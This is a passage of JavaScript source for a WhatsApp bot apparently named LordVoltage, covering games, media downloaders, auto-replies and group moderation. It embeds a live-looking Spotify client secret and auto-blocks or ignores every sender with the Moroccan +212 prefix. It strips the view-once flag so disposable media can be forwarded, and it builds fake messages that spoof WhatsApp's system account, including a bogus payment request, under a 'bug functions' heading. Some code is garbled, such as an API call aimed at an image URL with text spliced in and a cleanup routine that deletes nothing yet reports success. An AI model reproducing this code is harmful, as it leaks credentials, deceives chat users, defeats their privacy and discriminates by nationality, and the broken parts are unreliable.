	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room13.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'The Game Is Over',
	    '-2': 'Invalid',
	    '-1': 'Invalid Position',
	    0: 'Invalid Position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room13.game.winner) isWin = true
	    else if (room13.game.board === 511) isTie = true
	    let arr = room13.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room13.game._currentTurn = m.sender === room13.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room13.game.currentTurn : room13.game.winner
	    let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
❌: @${room13.game.playerX.split('@')[0]}
⭕: @${room13.game.playerO.split('@')[0]}

Type *surrender* to give up and admit defeat`
	    if ((room13.game._currentTurn ^ isSurrender ? room13.x : room13.o) !== m.chat)
	    room13[room13.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room13.x !== room13.o) await LordVoltage.sendText(room13.x, str, m, { mentions: parseMention(str) } )
	    await LordVoltage.sendText(room13.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room13.id]
	    }
	    }

        //Suit PvP
	     //end
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

		// auto set bio
	if (db.settings[botNumber].autobio) {
	    let setting = global.db.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await LordVoltage.updateProfileStatus(`${LordVoltage.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}

//autoblock 212
if (setAutoBlockMorocco) {
if (m.sender.startsWith('212')) return LordVoltage.updateBlockStatus(m.sender, 'block')
}

        //download status #ctto
        try {
  const textLower = m.text.toLowerCase();
  if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await LordVoltage.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        LordVoltage.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        LordVoltage.sendMessage('*Downloading status. . .*');
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await LordVoltage.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        LordVoltage.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        LordVoltage.sendMessage('*Downloading status. . .*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}
if (global.autoReact && global.autoReact[m.chat]) {
    const emojis = [
        "😀", "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
        "😍", "😘", "😎", "🤩", "🤔", "😏", "😣", "😥", "😮", "🤐",
        "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒", "😓",
        "😔", "😕", "🙃", "🤑", "😲", "😖", "😞", "😟", "😤", "😢",
        "😭", "😨", "😩", "🤯", "😬", "😰", "😱", "🥵", "🥶", "😳",
        "🤪", "😡", "😠", "🤬", "😷", "🤒", "🤕", "🤢", "🤮", "🤧",
        "😇", "🥳", "🤠", "🤡", "🤥", "🤫", "🤭", "🧐", "🤓", "😈",
        "👿", "👹", "👺", "💀", "👻", "👽", "👾", "🤖", "🎃", "😺",
        "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "💋", "💌",
        "👑", "💝", "💖", "💗", "💓", "💞", "💕", "🎭", "💔", "❤️"
    ]; // List of emojis to choose from

    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]; // Pick a random emoji

    try {
        await LordVoltage.sendMessage(m.chat, {
            react: {
                text: randomEmoji, // Emoji to react with
                key: m.key,        // Message key to react to
            },
        });
    } catch (err) {
        console.error('Error while reacting:', err.message);
    }
}
//autokick 212
if (getAutoKickMoroccoStatus) {
if (m.isGroup && m.sender.startsWith('212')) return 
}


//antispam kick
if (getAntispamStatus) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await LordVoltage.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
async function sendLordVoltageMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await LordVoltage.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
const replynano = async (teks) => {
  try {
    const imageBuffer = fs.readFileSync('./data/image/thumb.jpg'); // Read the image file

    LordVoltage.sendMessage(m.chat, {
      text: teks,
      contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363400964601488@newsletter', 
         newsletterName: '[𝐒𝐀𝐌𝐒𝐔𝐍𝐆_𝐗𝐌𝐃]' 
        },
        externalAdReply: {
          showAdAttribution: false,
          containsAutoReply: true,
          title: `${global.botname}`,
          body: `© POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧`,
          previewType: "VIDEO", // or try "NONE"
          thumbnail: imageBuffer,  // Try sending the binary data
          mediaUrl: 'https://files.catbox.moe/06g8rb.jpg', // Add mediaUrl
          sourceUrl: 'https://files.catbox.moe/06g8rb.jpg',
          renderLargerThumbnail: false  // Or try true

        }
      }
    }, { quoted: fkontak });
  } catch (error) {
    console.error("Error in replynano:", error);
    // Handle the error appropriately (e.g., send an error message)
  }
};

const fsaluran = { key : {
remoteJid: 'status@broadcast',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363400964601488@newsletter',
    newsletterName: '[𝐒𝐀𝐌𝐒𝐔𝐍𝐆_𝐗𝐌𝐃]',
    caption: body
}}}

const reply = (teks) => { 
    LordVoltage.sendMessage(from, { text: teks }, { quoted : m})
}
/**
 * Checks if a command sender has the necessary group admin or creator permissions.
 *
 * @param {object} m The message object.
 * @param {function} reply The reply function.
 * @param {boolean} isGroupAdmins True if the sender is a group admin.
 * @param {boolean} DanzTheCreator True if the sender is the bot creator.
 * @returns {boolean} True if the sender has permission, false otherwise. If false, it also sends the appropriate reply.
 */
function checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator) {
    if (!m.isGroup) {
        reply(mess.only.group);
        return false; // Not a group, no permission
    }

    if (DanzTheCreator) {
        if (isGroupAdmins) {
            // Creator is an admin, permission granted
            return true;
        } else {
            // Creator is NOT an admin, specific denial message
            reply('Make Me Admin To Use This Command');
            return false; // Permission denied for creator if not admin
        }
    } else {
        // Sender is NOT the creator
        if (isGroupAdmins) {
            // Not creator, but IS an admin, permission granted
            return true;
        } else {
            // Not creator AND not admin, general denial message
            reply('This command is for group admins only!');
            return false; // Permission denied for regular non-admin
        }
    }
}
//bug functions
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
LordVoltage.sendImageAsSticker = async (jid, media, m, options = {}) => {
    let { Sticker, StickerTypes } = require('wa-sticker-formatter')
    const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
    let jancok = new Sticker(media, {
        pack: global.packname, // The pack name
        author: global.author, // The author name
        type: StickerTypes.FULL, // The sticker type
        categories: ['🤩', '🎉'], // The sticker category
        id: '12345', // The sticker id
        quality: 50, // The quality of the output file
        background: '#FFFFFF00' // The sticker background color (only for full stickers)
    })
    let stok = getRandom(".webp")
    let nono = await jancok.toFile(stok)
    let nah = fs.readFileSync(nono)
    await LordVoltage.sendMessage(jid,{sticker: nah},{quoted: m})
    return await fs.unlinkSync(stok)
     }

const sendvn = (teks) => {
LordVoltage.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
async function getAccessToken() {
    try {
        const client_id = 'acc6302297e040aeb6e4ac1fbdfd62c3';
        const client_secret = '0e8439a1280a43aba9a5bc0a16f3f009';
        const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");
        const response = await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
            headers: {
                Authorization: `Basic ${basic}`,
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });
        const data = response.data;
        return data.access_token;
    } catch (error) {
        console.error('Error getting Spotify access token:', error);
        throw 'An error occurred while obtaining Spotify access token.';
    }
}
async function spotifydl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      const kemii = await axios.get(
        `https://api.fabdl.com/spotify/get?url=${encodeURIComponent(url)}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const kemi = await axios.get(
        `https://api.fabdl.com/spotify/mp3-convert-task/${kemii.data.result.gid}/${kemii.data.result.id}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const result = {};
      result.title = kemii.data.result.name;
      result.type = kemii.data.result.type;
      result.artis = kemii.data.result.artists;
      result.durasi = kemii.data.result.duration_ms;
      result.image = kemii.data.result.image;
      result.download = "https://api.fabdl.com" + kemi.data.result.download_url;
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
};

async function searchSpotify(query) {
    try {
        const access_token = await getAccessToken();
        const response = await axios.get(`https://api.spotify.com/v1/search?q=${query}&type=track&limit=10`, {
            headers: {
                Authorization: `Bearer ${access_token}`,
            },
        });
        const data = response.data;
        const tracks = data.tracks.items.map(item => ({
            name: item.name,
            artists: item.artists.map(artist => artist.name).join(', '),
            popularity: item.popularity,
            link: item.external_urls.spotify,
            image: item.album.images[0].url,
            duration_ms: item.duration_ms,
        }));
        return tracks;
    } catch (error) {
        console.error('Error searching Spotify:', error);
        throw 'An error occurred while searching for songs on Spotify.';
    }
}
async function NanoHDvideo() {
  try {
    const inputVideo = await LordVoltage.downloadAndSaveMediaMessage(quoted);
    const outputVideo = 'output_2k.mp4';
    await new Promise((resolve, reject) => {
      ffmpeg(inputVideo)
        .outputOptions('-vf', 'scale=2560:1440')
        .on('start', commandLine => {
          console.log('Start the process with the command:', commandLine);
        })
        .on('progress', progress => {
          console.log('Proses sedang berjalan:', progress.percent.toFixed(2) + '% selesai');
        })
        .on('end', () => {
          console.log('Proses selesai!');
          resolve();
        })
        .on('error', (err, stdout, stderr) => {
          console.error('There is an error:', err.message);
          console.error('stdout:', stdout);
          console.error('stderr:', stderr);
          reject(err);
        })
        .save(outputVideo);
    });
    const caption = 'Successfully made the video HD';
    await LordVoltage.sendMessage(m.chat, { caption: caption, video: { url: path.resolve(outputVideo) } }, { quoted: m });

  } catch (error) {
   reply('There is an error:', error);
  }
}
//autoreply
for (let BhosdikaXeon of NanoVoiceNote) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./data/voltage/assets/audio/${BhosdikaXeon}.mp3`)
LordVoltage.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of NanoSticker){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./data/voltage/sparkmedia/sticker/${BhosdikaXeon}.webp`)
LordVoltage.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageNano){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./data/voltage/sparkmedia/image/${BhosdikaXeon}.jpg`)
LordVoltage.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoNano){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./data/voltage/sparkmedia/video/${BhosdikaXeon}.mp4`)
LordVoltage.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}
LordVoltage.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message
}
}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await LordVoltage.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
return waMessage
}


const lep = {
key: {
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }
//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 996842999999,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363400964601488@newsletter',
    newsletterName: '[𝐒𝐀𝐌𝐒𝐔𝐍𝐆_𝐗𝐌𝐃]',
    caption: '♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧\n𝐒𝐀𝐌𝐒𝐔𝐍𝐆_𝐗𝐌𝐃' , 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=256xxxxx:256xxxxx\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./data/image/thumb.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await LordVoltage.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await LordVoltage.getName(i)}\nFN:${await LordVoltage.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${yt}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

// Calculate a timestamp for a date extremely far in the future (e.g., Year 2100)
// This converts the date to milliseconds since epoch, then to seconds.
const farFutureTimestamp = Math.floor(new Date('2100-01-01T00:00:00Z').getTime() / 1000);

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`, // Ensure ownername is defined elsewhere in your code
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD", // Changed to NGN as you are in Nigeria
			amount1000: 999999999, // Represents 999,999.999 (e.g., NGN 999,999.99)
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}` // Ensure botname is defined elsewhere in your code
				}
			},
			expiryTimestamp: farFutureTimestamp, // This is the key: set to a very distant future
			amount: {
				value: 91929291929, // This value is in subunits (e.g., kobo for NGN)
				offset: 1000,
				currencyCode: "NGN"
			}
		}
	}
};



//let xeonrecordin = ['recording','composing']
//let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]

if (!m.key.fromMe && db.settings[botNumber].autoread){
  const readkey = {
    remoteJid: m.chat,
    id: m.key.id,
    participant: m.isGroup ? m.key.participant : undefined
  }
  await LordVoltage.readMessages([readkey]);
}

LordVoltage.sendPresenceUpdate('available', m.chat);

if (getAutotypingStatus()) { // Call the function with parentheses
  if (command) {
    LordVoltage.sendPresenceUpdate('composing', from);
  }
}

if (getAutoRecordingStatus()) { // Call the function with parentheses
  if (command) {
    LordVoltage.sendPresenceUpdate('recording', from);
  }
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await LordVoltage.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await LordVoltage.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}


const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await LordVoltage.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await LordVoltage.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}
//================================================================
if (m.isGroup && !m.key.fromMe && isAutosimi ) {
try {
const ainya = await fetchJson(`https://files.catbox.moe/06g8rb.jpg IS ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧  , ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧ &text=$${args.join(" ")}`)
const hangsul = ainya.result
    reply(`${hangsul}`)
  } catch (error) {
    reply(`${error}`)
  }
}
if (m.isGroup && isAutoAiGc) {
try {
const ainya = await fetchJson(`https://files.catbox.moe/06g8rb.jpg IS ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧ , ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧ &text=$${args.join(" ")}`)
const hangsul = ainya.result
    reply(`${hangsul}`)
  } catch (error) {
    reply(`${error}`)
  }
}
if (automati) {
  nodecron.schedule('0 */1 * * *', () => {
    process.exit()
  })
}
if (shouldExit) {
    nodecron.schedule('0 */15 * * * *', () => {
        fs.readdir("./session", async function (err, files) {
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
if(filteredArray.length == 0) return console.log(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
await filteredArray.forEach(function (file) {
});
await sleep(2000)
console.log("Successfully deleted all Memories in the session folder")    
});
    })
}
if (!m.key.fromMe && m.isGroup && isnanochat) {
  try {
const ainya = await fetchJson(`https://files.catbox.moe/06g8rb.jpg IS ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧ , ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧ &text=$${args.join(" ")}`)
const hangsul = ainya.result
    reply(`${hangsul}`)
  } catch (error) {
    reply(`${error}`)
  }
}
//=================================================================
if (!m.isGroup && !DanzTheCreator && db.settings[botNumber].onlygrub ) {
        	if (command){
            return;
            }
        }
//=================================================================
async function makeSticker(media,Sticker, StickerTypes){
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
let jancok = new Sticker(media, {
pack: global.packname, // The pack name
author: global.author, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom('.webp')
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono.path);
await LordVoltage.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
}

async function sendPoll(jid, text, list) {
LordVoltage.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
hasil.push({
link: $(h).find('a').attr('href'),
gambar: $(h).find('img').attr('data-src'),
karakter: $(h).find('div.char-name').text().trim(),
anime: $(h).find('div.anime-title').text().trim(),
episode: $(h).find('div.meta').text(),
up_at: $(h).find('small.meta').text(),
quotes: $(h).find('div.quote').text().trim()
})
            })
            resolve(hasil)
        }).catch(reject)
    })
}


async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}

async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
